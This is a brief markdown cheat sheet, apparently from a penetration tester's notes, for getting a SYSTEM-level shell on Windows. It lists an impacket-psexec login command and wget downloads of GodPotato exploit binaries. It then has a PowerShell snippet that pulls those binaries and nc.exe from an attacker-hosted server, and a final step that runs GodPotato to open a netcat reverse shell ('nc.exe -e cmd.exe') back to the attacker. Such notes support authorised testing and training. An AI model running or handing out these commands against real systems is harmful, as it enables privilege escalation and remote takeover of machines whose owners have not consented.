## privilege system shell
### impacket-exec
```
impacket-psexec "domain/user:pass"@x.x.x.x
```

### godpotato
shuould use all version
```
mkdir ~/godpotato; cd ~/godpotato; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

download
```
$IP = "ip"; $URLHOST = "http://" + $IP + ":8000/"; $PATH = "/godpotato/"; $FILE = "GodPotato-NET2.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile $FILE; $FILE = "GodPotato-NET35.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile $FILE; $FILE = "GodPotato-NET4.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile $FILE; $PATH = ""; $FILE = "nc.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile nc.exe;
```

execute
```
.\godpotato.exe -cmd "C:/path/nc.exe -e cmd.exe $IP $PORT"
```